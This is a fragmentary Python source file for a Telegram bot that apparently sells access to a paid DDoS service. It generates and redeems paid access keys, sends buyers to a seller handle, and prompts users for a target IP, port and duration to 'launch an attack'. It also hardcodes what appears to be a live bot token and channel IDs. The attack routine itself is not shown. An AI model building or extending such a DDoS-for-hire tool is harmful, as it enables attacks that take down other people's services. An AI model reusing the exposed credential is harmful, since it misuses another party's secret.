...
TOKEN = "7314136037:AAG6xlNvvPay6nBjcqfmTv2BmiYzpLdF1WY"
FORWARD_CHANNEL_ID = -7484387718
CHANNEL_ID = -7484387718
error_channel_id = -7484387718
...
def generate_key(days):
    try:
        ...
        key = f"VECTOR-{expiration_date.timestamp():.0f}"
            ...
            if stored_key == key:
                ...
                for user_data in users.values():
                    if user_data.get('redeemed_key') == key:
                        return "This key has already been redeemed. Buy a new key from @Dragoncheatsz ."

                if not has_access(user_id):
                    users[str(user_id)] = {'redeemed_key': key, 'has_access': True}
                    save_users(users)

                    bot.send_message(user_id, "Buy a New code From @Dragoncheatsz")
    ...
    try:
        if not has_access(user_id):
            bot.send_message(chat_id, "*🚫 Access Denied!*\n"
                                       ...
                                       "*Contact the owner for assistance: @Dragoncheatsz*", parse_mode='Markdown')
            return
        ...
        bot.send_message(chat_id, "*💣 Ready to launch an attack?*\n"
                                   ...
                                   "*Example: 20.235.143.91 29062 180* 🔥", parse_mode='Markdown')
...
def handle_start(message):
    ...
    welcome_message = f"""
    Welcome To Paid Ddos 
    For enquiry @Dragoncheatsz
